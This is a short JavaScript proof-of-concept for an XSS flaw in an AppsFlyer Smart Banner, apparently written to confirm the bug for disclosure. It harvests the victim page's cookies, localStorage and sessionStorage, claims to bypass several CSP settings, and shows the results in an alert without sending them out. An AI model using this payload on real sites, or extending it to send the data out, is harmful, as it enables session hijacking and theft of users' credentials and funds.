// AppsFlyer Smart Banner XSS PoC — s1n6h
// Executes on victim origin via javascript: URI or createElement script injection
// Bypasses: report-only CSP, unsafe-inline CSP, strict-dynamic CSP

(async () => {
  const data = {
    origin: window.location.origin,
    cookies: document.cookie || '(none)',
    localStorage: Object.keys(localStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(localStorage))) : '(empty)',
    sessionStorage: Object.keys(sessionStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))) : '(empty)',
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  
  alert(
    'XSS confirmed on: ' + data.origin + '\n\n' +
    'Cookies: ' + data.cookies + '\n\n' +
    'LocalStorage: ' + data.localStorage.substring(0, 200) + '\n\n' +
    'SessionStorage: ' + data.sessionStorage.substring(0, 200) + '\n\n' +
    'In a real attack, this would steal wallet funds, session tokens, or credentials.'
  );
})();
